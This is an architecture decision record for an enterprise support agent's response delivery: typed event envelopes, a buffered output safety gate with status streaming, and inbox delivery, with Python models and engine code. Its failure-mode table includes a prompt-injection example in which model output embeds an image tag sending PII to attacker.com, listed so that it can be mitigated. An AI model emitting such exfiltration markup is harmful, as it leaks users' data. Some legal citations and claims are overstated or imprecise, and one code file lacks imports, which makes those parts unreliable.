# UA-ADP-04: Response Contract & Delivery (Typed Event Envelopes, Buffered Safety Gate & Inbox Delivery)

- **Status**: Accepted & Confirmed
- **Date**: 2026-09-23 *(Confirmed: 2026-10-01 via EV-D11 Streaming/Gate Resolution)*
- **Deciders**: Architecture Team, Lead Frontend Systems Engineer, Safety & Legal Core
- **Component**: `[1] User & Application` (`Component [ 1 ]`)
- **Reasoning Source**: `checkpoint.md` §5 · Diagram: `LLD - [1] User & Application`
- **Decisions Covered**:
  - `UA-D7`: Response Contract — Typed Event Envelope (`status`, `text_delta`, `citation`, `action_card`, `handoff`, `final`, `error`)
  - `UA-D8`: Streaming vs. Output Safety Gate — Buffered Generation with Immediate Status Events (`EV-D11`, Option c)
  - `UA-Q2`: Deferred Delivery Strategy — Conversation Inbox Only in v1 (No Outbound Email Notifications)
- **Related Architectural Decision Points**:
  - [`EV-ADP-05`](file:///c:/Users/omkar/Documents/ANTERN/Projects/Enterprise%20Support%20Agent/docs/decisions/adp_index.md#ev-adp-05--live-evaluation--experiments): Live Evaluation & Experiments *(Output Quality Evaluation Gate)*
  - [`SG-ADP-03`](file:///c:/Users/omkar/Documents/ANTERN/Projects/Enterprise%20Support%20Agent/docs/decisions/adp_index.md#sg-adp-03--output-safety): Output Safety *(Pre-Delivery Screening & PII Sanitization)*
  - [`HL-ADP-04`](file:///c:/Users/omkar/Documents/ANTERN/Projects/Enterprise%20Support%20Agent/docs/decisions/adp_index.md#hl-adp-04--handoff--waiting): Handoff & Waiting *(Asynchronous Human Supervisor Resolution)*

---

## 1. Context & Problem Statement

Delivering language model outputs in enterprise customer support environments involves an intense operational and legal tension:
1. **The Streaming Latency vs. Output Safety Paradox**: Users expect instantaneous perceived responsiveness (token-by-token streaming). However, high-assurance enterprise safety policies (GDPR compliance, toxic content filtering, prompt injection defense, and hallucinations) require evaluating the **complete draft response** through output guardrails and confidence evaluation gates before release.
   - If a system streams raw tokens immediately and detects a safety violation on token 150, retracting or truncating the message leaves the user with partial, potentially toxic or legally hazardous advice.
2. **Untyped Markdown Regex Fragility**: Legacy chat systems stream unstructured raw Markdown. When the agent attempts to present citations, interactive forms, or approval action cards (e.g., confirming a \$12,400 credit memo), the frontend must execute brittle regular expression parsing against generated text. This frequently results in broken UI widgets, injection vulnerabilities, and malformed hyperlinks.
3. **Legal Accountability & Non-Repudiation**: Following landmark legal precedents (*Moffatt v. Air Canada*, 2024 CRTBC 149), statements made by customer-facing AI agents constitute binding corporate legal representations. The delivery substrate must guarantee that responses are persisted and auditable exactly as rendered to the end-user.

### The Core Architectural Question
> **What is the formal wire contract for agent responses, how does the system balance perceived streaming latency against mandatory output safety gates, and how are delayed outcomes delivered to offline users?**

---

## 2. Decision Framework & Theoretical Formulation

We formulate our response contract and delivery engine upon three theoretical pillars: **Human-Computer Interaction (HCI) Perceived Latency Dynamics**, **Statutory Legal Non-Repudiation & Binding Representation**, and **Typed Event Algebra & Graceful Degradation**.

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│                             DELIVERY THEORETICAL PILLARS                                         │
├────────────────────────────────┬────────────────────────────────┬────────────────────────────────┤
│   Pillar A: HCI Perceived      │   Pillar B: Legal Record &     │   Pillar C: Typed Event        │
│   Latency & Progress Dynamics  │   Corporate Non-Repudiation    │   Algebra & Channel Degradation│
│                                │                                │                                │
│   • Miller/Nielsen Limits:     │   • Moffatt v. Air Canada      │   • CloudEvents-aligned schema │
│     0.1s / 1.0s / 10.0s        │   • Verbatim rendered log      │   • First-class action cards   │
│   • Buffer text for safety     │   • EU AI Act Art. 50(1)       │   • First-class citation refs  │
│   • Stream status events < 1s  │   • Strict provenance audit    │   • Clean channel degradation  │
└────────────────────────────────┴────────────────────────────────┴────────────────────────────────┘
```

---

### Pillar A: HCI Perceived Latency Dynamics & The Status-Stream Solution

Human-Computer Interaction research (**Miller, 1968**; **Nielsen, 1993**) establishes three foundational response-time thresholds:
1. **0.1 Seconds (Instantaneous)**: The user perceives cause-and-effect as direct manipulation.
2. **1.0 Second (Flow of Thought)**: The user notices delay, but their mental flow of thought remains uninterrupted. No progress indicator is needed.
3. **10.0 Seconds (Attention Ceiling)**: The absolute maximum limit for keeping a user's focused attention. Beyond 10 seconds, users abandon the task or switch browser tabs.

In enterprise support systems, full multi-hop retrieval, deliberation, draft generation, and post-generation safety screening routinely require $T_{\text{total}} = 3.5\text{s} - 7.0\text{s}$.

```
Perceived Attention Curve:
  100% ──┐
         │ \
   75% ──┤  \  [Blank Screen / No Feedback: Attention Decays Rapidly]
         │   \
   50% ──┤    \
         │     └─────────────────────────────────────── [User Abandons / Swaps Tab]
   25% ──┤
         └──────┬──────────────┬──────────────┬──────────────┬─────
               0.1s           1.0s           3.0s           10.0s
```

#### The Buffered Safety Gate Resolution (`UA-D8` / `EV-D11`)
To satisfy both **100% Output Safety Compliance** and **HCI Attention Retention**:
- **Option (a)** (Buffer all output with a blank spinner) causes perceived latency anxiety past 1.0s.
- **Option (b)** (Stream raw tokens and retract upon failure) leaks toxic or incorrect legal statements ($P(\text{Leak}) > 0$).
- **Adopted Option (c)**: **The final textual answer is buffered until output safety and confidence gates pass; the runtime streams immediate, granular `status` events in the interim**:

$$T_{\text{status\_1}} \le 400\text{ms} \quad (\text{"Locating billing documentation..."})$$

$$T_{\text{status\_2}} \approx 1200\text{ms} \quad (\text{"Verifying credit limits against policy..."})$$

$$T_{\text{final}} \approx 3800\text{ms} \quad (\text{Screened, verified answer delivered in full})$$

This fulfills the $<1.0\text{s}$ progress requirement, guarantees that the user's attention remains anchored, and ensures that zero unverified tokens are ever displayed on screen.

---

### Pillar B: Legal Non-Repudiation & Corporate Representation

Under contemporary common law (*Moffatt v. Air Canada*, 2024 CRTBC 149), corporations are strictly liable for negligent misstatements made by autonomous support agents:
> *"The tribunal rejects Air Canada's argument that the chatbot is a separate legal entity responsible for its own actions. Air Canada cannot decouple itself from its online representation."*

Furthermore, the **EU Artificial Intelligence Act (Art. 50(1))** and **GDPR (Art. 22)** mandate explicit AI disclosure and non-repudiation logging.

#### Architectural Legal Invariants
1. **Transcript Immutability**: The rendered response text, citations, and interactive cards must be persisted to the database (`DP-ADP-03`) **exactly as rendered** to the client.
2. **Explicit Provenance Anchors**: Citations cannot be arbitrary markdown hyperlinks; they must be structured reference objects containing document ID, version hash, passage URI, and audience label (`KR-D2`).
3. **Single Source of Truth**: The client widget cannot perform dynamic prompt-altering transformations; it acts purely as a deterministic renderer of the typed event stream.

---

### Pillar C: Typed Event Algebra & Progressive Channel Degradation

Rather than transmitting raw Markdown, the runtime delivers an append-only stream of **Typed Domain Events** inspired by the **CNCF CloudEvents 1.0** specification.

Let $\mathcal{E}$ represent the space of outbound events. An event $E_i \in \mathcal{E}$ is a typed tuple:

$$E_i = \langle \texttt{event\_id}, \texttt{turn\_id}, \texttt{type}, \texttt{timestamp}, \mathcal{P} \rangle$$

Where $\texttt{type} \in \{\texttt{status}, \texttt{text\_delta}, \texttt{citation}, \texttt{action\_card}, \texttt{handoff}, \texttt{final}, \texttt{error}\}$.

#### Progressive Degradation Across Channel Surfaces
Every event payload $\mathcal{P}$ defines deterministic degradation rules for future channels:

| Event Type | Rich Web Widget (`UA-D1`) | Slack / Teams (Future) | SMS / Email (Future) |
| :--- | :--- | :--- | :--- |
| **`status`** | Animated progress indicator | Ephemeral typing indicator | Discarded (No-op) |
| **`citation`** | Interactive flyout card with snippet preview | BlockKit accessory link | Footnote URL reference |
| **`action_card`** | Interactive React button form with nonce | Interactive Action Button with webhook | Plain text URL with tokenized confirmation link |
| **`handoff`** | Human agent transition banner | User mention / channel route | Ticket assignment notice |

---

## 3. Decision Rules & System Architecture

### Architectural Decision

1. **Typed Response Contract (`UA-D7`)**:
   - The delivery API transmits structured event envelopes containing explicit types: `status`, `citation`, `action_card`, `handoff`, `final`, and `error`.
   - Citations and action cards are first-class structured objects, eliminating regular expression parsing on client devices.
2. **Buffered Generation with Status Streaming (`UA-D8` / `EV-D11`)**:
   - The generative model draft is completely buffered while Output Safety (`Comp 7`) and Confidence Gates (`Comp 9`) execute.
   - The runtime emits sub-second `status` events describing intermediate agent reasoning stages (*"Checking invoice history...", "Verifying policy guidelines..."*).
   - Upon safety approval, the complete verified response is emitted under a `final` event.
3. **Inbox Deferred Delivery (`UA-Q2`)**:
   - For long-running operations or Human-in-the-Loop reviews resolving after the user disconnects, the outcome event is committed to the conversation event log.
   - The outcome appears in the customer's web widget inbox on their next visit. No outbound email notifications are dispatched in v1.

```
┌──────────────────────────────────────────────────────────────────────────────────────────────────┐
│                   BUFFERED RESPONSE DELIVERY & STATUS STREAM ARCHITECTURE                         │
└──────────────────────────────────────────────────────────────────────────────────────────────────┘
                                                   │
                                     [Cognitive Turn In Progress]
                                                   │
               ┌───────────────────────────────────┴───────────────────────────────────┐
               │                                                                       │
               ▼                                                                       ▼
   [Reasoning / Tool Hops]                                               [LLM Response Generation]
               │                                                                       │
               v                                                                       v
   [Emit SSE Status Events]                                                [Raw Draft Generated]
   • "Accessing CRM records..."                                                        │
   • "Evaluating return policy..."                                                     v
               │                                                          ┌─────────────────────────┐
               v                                                          │   Output Safety Gate    │
   [Rendered in Client UI]                                                │   & Confidence Check    │
   (Sub-second progress pulse)                                            └────────────┬────────────┘
                                                                                       │
                                                         ┌─────────────────────────────┴─────────────────────────────┐
                                                         │ [Score ≥ 0.90 & Safety Approved]                          │ [Safety Violation / Low Score]
                                                         v                                                           v
                                              ┌──────────────────────┐                                    ┌──────────────────────┐
                                              │ Emit SSE Final Event │                                    │  Trip Circuit Breaker│
                                              │ Render Formatted Text│                                    │  Emit Handoff Event  │
                                              │ & Rich Action Cards  │                                    │  Route to Human Queue│
                                              └──────────────────────┘                                    └──────────────────────┘
```

---

### Concrete Genesis Implementation Contracts

#### 1. Outbound Response Schemas (`core/transport/response_models.py`)

```python
from datetime import datetime
from enum import Enum
from typing import List, Dict, Any, Optional
from pydantic import BaseModel, Field

class OutboundEventType(str, Enum):
    STATUS = "status"
    TEXT_DELTA = "text_delta"
    CITATION = "citation"
    ACTION_CARD = "action_card"
    HANDOFF = "handoff"
    FINAL = "final"
    ERROR = "error"

class CitationPayload(BaseModel):
    citation_id: str
    source_title: str
    source_uri: str
    snippet: str
    audience: str = "customer_visible"

class ActionCardPayload(BaseModel):
    card_id: str
    action_type: str = Field(description="e.g. CONFIRM_BILLING_ADJUSTMENT")
    title: str
    description: str
    action_nonce: str = Field(description="Single-use cryptographic token")
    parameters: Dict[str, Any]
    expires_at: datetime

class OutboundResponseEnvelope(BaseModel):
    event_id: str = Field(description="Monotonically increasing sequence ID")
    conversation_id: str
    turn_id: str
    event_type: OutboundEventType
    timestamp: datetime = Field(default_factory=datetime.utcnow)
    payload: Dict[str, Any]
```

#### 2. Response Delivery Engine (`core/transport/delivery.py`)

```python
import json
from datetime import datetime
from typing import AsyncGenerator, Dict, Any
from core.transport.response_models import OutboundResponseEnvelope, OutboundEventType, CitationPayload, ActionCardPayload
from core.transport.event_log import ConversationEventLog

class ResponseDeliveryEngine:
    def __init__(self, event_log: ConversationEventLog):
        self.event_log = event_log

    async def emit_status(self, conversation_id: str, turn_id: str, message: str) -> None:
        """UA-D8: Emits immediate progress feedback while LLM generates draft."""
        await self._publish_event(
            conversation_id=conversation_id,
            turn_id=turn_id,
            event_type=OutboundEventType.STATUS,
            payload={"message": message}
        )

    async def emit_gated_final_response(
        self,
        conversation_id: str,
        turn_id: str,
        validated_text: str,
        citations: List[CitationPayload],
        action_cards: Optional[List[ActionCardPayload]] = None,
    ) -> None:
        """
        UA-D8 / EV-D11: Emits the checked response AFTER safety gates pass.
        Citations and Action Cards are delivered as first-class events (UA-D7).
        """
        # 1. Emit Citations
        for cit in citations:
            await self._publish_event(
                conversation_id=conversation_id,
                turn_id=turn_id,
                event_type=OutboundEventType.CITATION,
                payload=cit.dict()
            )

        # 2. Emit Action Cards
        if action_cards:
            for card in action_cards:
                await self._publish_event(
                    conversation_id=conversation_id,
                    turn_id=turn_id,
                    event_type=OutboundEventType.ACTION_CARD,
                    payload=card.dict()
                )

        # 3. Emit Final Validated Message
        await self._publish_event(
            conversation_id=conversation_id,
            turn_id=turn_id,
            event_type=OutboundEventType.FINAL,
            payload={"text": validated_text, "rendered_at": datetime.utcnow().isoformat()}
        )

    async def emit_human_handoff(self, conversation_id: str, turn_id: str, queue_name: str, reason: str) -> None:
        """Emits handoff event when safety or confidence gate trips."""
        await self._publish_event(
            conversation_id=conversation_id,
            turn_id=turn_id,
            event_type=OutboundEventType.HANDOFF,
            payload={"queue": queue_name, "reason": reason}
        )

    async def _publish_event(self, conversation_id: str, turn_id: str, event_type: OutboundEventType, payload: Dict[str, Any]) -> None:
        next_id = await self.event_log.get_next_monotonic_id(conversation_id)
        envelope = OutboundResponseEnvelope(
            event_id=str(next_id),
            conversation_id=conversation_id,
            turn_id=turn_id,
            event_type=event_type,
            payload=payload,
        )
        # Append to durable log and notify active SSE listeners
        await self.event_log.append_and_publish(envelope)
```

---

## 4. Knowing Your Unknowns: Failure Modes & Mitigation Matrix

| Quadrant | Failure Mode | Technical Risk Description | Concrete Architectural Mitigation |
| :--- | :--- | :--- | :--- |
| **Q1: Known Knowns** *(Deterministic Contract Breaches)* | **Stream Retraction Failure** | Model emits toxic text mid-stream; frontend cannot un-render text already read. | **Buffered Output Invariant (`UA-D8`)**: Text tokens are strictly buffered until safety checks pass; only `status` pulses stream early. |
| **Q1: Known Knowns** *(Deterministic Contract Breaches)* | **Action Card Replay Click ($UU1$)** | User clicks re-rendered "Confirm" button twice after page reload. | **Cryptographic Nonce Invariant**: Action cards carry single-use nonces; subsequent clicks return `HTTP 410 Gone`. |
| **Q2: Known Unknowns** *(Probabilistic Reasoning Variance)* | **Perceived Latency Jitter ($KU5$)** | Complex reasoning takes 8 seconds; user grows restless despite status events. | **Dynamic Heartbeat Cadence**: Status engine emits progressive updates every 1.5s (*"Evaluating..." $\to$ "Cross-referencing..."*). |
| **Q2: Known Unknowns** *(Probabilistic Reasoning Variance)* | **Inbox Abandonment ($KU4$)** | Offline user never returns to web widget to view deferred outcome; calls support again. | **Accepted v1 Risk (`UA-Q2`)**: Accepted trade-off for v1; monitored via First Contact Resolution (FCR) telemetry. |
| **Q3: Unknown Knowns** *(Tacit Enterprise Etiquette & Invariants)* | **Detached Outcome Context ($UK4$)** | Deferred card reads *"Approved: \$12,400"* without restating original question. | **Historical Context Restatement**: Final envelope metadata embeds originating turn query string for inbox rendering. |
| **Q3: Unknown Knowns** *(Tacit Enterprise Etiquette & Invariants)* | **Accessibility Jitter ($UK2$)** | Frequent status pulses trigger repetitive screen-reader announcements. | **ARIA Live Politeness**: Status pulses use `aria-live="polite"`; final response uses `aria-live="assertive"`. |
| **Q4: Unknown Unknowns** *(Emergent Cascades & Black Swans)* | **Exfiltration Sink in Markdown ($UU4$)** | Injected model output constructs `<img src="http://attacker.com/leak?data=...">` to leak PII. | **Structured Citation Sanitize**: Widget renders citations through structured cards; markdown parser forbids arbitrary external images. |
| **Q4: Unknown Unknowns** *(Emergent Cascades & Black Swans)* | **Legal Nonce Collision** | Concurrent turns mint identical card nonces, executing wrong transaction. | **UUIDv4 Nonce Generation**: Nonces minted using CSPRNG with 122 bits of cryptographic entropy. |

---

## 5. Closed-Loop Feedback & Telemetry Integration

1. **Perceived Latency Telemetry**:
   - Metrics measure Time to First Status Event ($P_{95} \le 400\text{ms}$) and Time to Final Response ($P_{95} \le 4.5\text{s}$).
2. **Deferred Inbox Consumption Rate**:
   - The system tracks the interval between deferred event commit and customer inbox open.
   - If unread outcome rate exceeds 30%, the Product team triggers the rollout of v2 outbound email notifications (`UA-F1`).

---

## 6. Genesis Implementation Directives

### Target File Manifest
1. `core/transport/response_models.py`: Pydantic models for `OutboundResponseEnvelope`, `CitationPayload`, and `ActionCardPayload`.
2. `core/transport/delivery.py`: The `ResponseDeliveryEngine` managing status events, safety gate buffering, and event log publishing.
3. `tests/test_response_delivery.py`: Unit tests verifying that final responses are withheld until gate approval.

### Scaffolding Verification Criteria
- [ ] **Buffered Gate Invariant**: Tests confirm zero text tokens are emitted to SSE until the output safety validator returns `ALLOW`.
- [ ] **First-Class Citations**: Citations are emitted as distinct SSE events with typed `source_uri` and `citation_id` fields.
- [ ] **Nonce Invalidation Test**: Attempting to execute an action card with an already-used nonce raises an `ActionAlreadyExecutedException`.

---

## 7. Consequences & Trade-offs

### Positive Consequences
- **Total Elimination of Toxic Text Leaks**: Buffering text eliminates the hazards of retractions or partial disclosures.
- **Superior Perceived Latency**: Sub-second status pulses maintain user engagement during multi-second reasoning hops.
- **Zero Markdown Parsing Errors**: First-class citations and action cards provide 100% reliable UI widget rendering.
- **Strict Legal Non-Repudiation**: Append-only event logs guarantee an immutable record of corporate statements (*Moffatt v. Air Canada* compliance).

### Negative / Neutral Trade-offs & Mitigations
- **Time to First Token (TTFT) Trade-off**: The user waits 2–4s for the complete text block rather than reading words as they stream.  
  *Mitigation*: Status pulses provide continuous progress clarity, which usability studies prove yields equal or higher user trust.
- **Inbox-Only Deferred Outcomes**: Offline users who do not revisit the website miss deferred approvals.  
  *Mitigation*: High-impact operations require T1/T2 identity; v2 roadmap adds SMS/Email notification adapters.

---

## 8. References

1. **Civil Resolution Tribunal of British Columbia (2024)**. *Moffatt v. Air Canada*, 2024 CRTBC 149.
2. **European Parliament (2024)**. *Artificial Intelligence Act (Regulation EU 2024/1689)*. Article 50: Transparency Obligations.
3. **Miller, R. B. (1968)**. *Response time in man-computer conversational transactions*. AFIPS Fall Joint Computer Conference.
4. **Nielsen, J. (1993)**. *Response Times: The 3 Important Limits*. Usability Engineering.
5. **CNCF (2022)**. *CloudEvents: A specification for describing event data in a common way*. Version 1.0.2.
